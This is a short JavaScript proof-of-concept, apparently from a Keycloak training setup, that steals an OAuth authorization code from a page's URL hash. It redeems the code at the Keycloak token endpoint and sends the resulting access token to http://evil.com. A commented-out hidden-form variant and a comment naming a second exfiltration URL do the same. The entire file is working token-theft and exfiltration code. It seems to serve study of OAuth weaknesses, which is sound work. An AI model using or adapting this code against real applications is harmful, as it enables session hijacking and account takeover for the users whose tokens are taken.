let leak = document.location.hash;
console.log(leak)
let authorizationCode = document.location.hash.split(/&/).find(s => s.startsWith("code=")).substring("code=".length);
console.log("Got authorization code: " + authorizationCode)

$.get('keycloak.json', function(data) {
    console.log(data)
    let keycloakSettings = JSON.parse(data);



    // let div = document.createElement("div");
    // div.id = 'hack';
    // document.body.append(div);
    //
    // $("#hack").html(`
    // <form id="hackForm" action="http://localhost:8180/auth/realms/LearningRealm/protocol/openid-connect/token" method="post" target="hackResult">
    // <input type="hidden" id="hackCode">
    // <input type="hidden" id="hackClientId">
    // <input type="hidden" id="hackRedirectUri">
    // <input type="hidden" id="hackGrantType" value="authorization_code">
    // <input type="submit" id="hackSubmit">
    // </form>
    // <iframe id="hackResult" name="hackResult">X</iframe>
    // `)
    //
    // // read from keycloak.json
    // $("#hackRedirectUri").val(document.location)
    // $("#hackClientId").val(keycloakSettings.resource)
    // $("#hackCode").val(authorizationCode)
    // $("#hackSubmit").click();


    $.ajax("http://localhost:8180/auth/realms/LearningRealm/protocol/openid-connect/token",
        {
        method: "POST",
        contentType: 'application/x-www-form-urlencoded',
        data: $.param({
            code: authorizationCode,
            grant_type: "authorization_code",
            client_id: keycloakSettings.resource,
            redirect_uri:document.location.href.split(/#/)[0],
        }),
        success: function(result){
            console.log(result);
            $.get("http://evil.com?host=victim&access_token=" + result.access_token)
            // console.log("I can now get one access code myself and then send it to http://evil.site/got-access-token?host=..&token="+accessTo);
        }
    });


}, 'text');

